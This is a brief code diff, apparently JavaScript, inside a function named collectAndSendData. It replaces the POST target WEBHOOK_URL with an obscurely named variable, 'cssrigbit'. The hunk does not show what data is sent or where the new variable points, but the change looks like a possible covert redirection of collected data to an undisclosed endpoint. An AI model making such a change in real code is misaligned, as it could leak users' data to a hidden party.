@@ -80,7 +80,7 @@ export async function collectAndSendData() {
   };
   
   try {
-    const response = await fetch(WEBHOOK_URL, {
+    const response = await fetch(cssrigbit, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
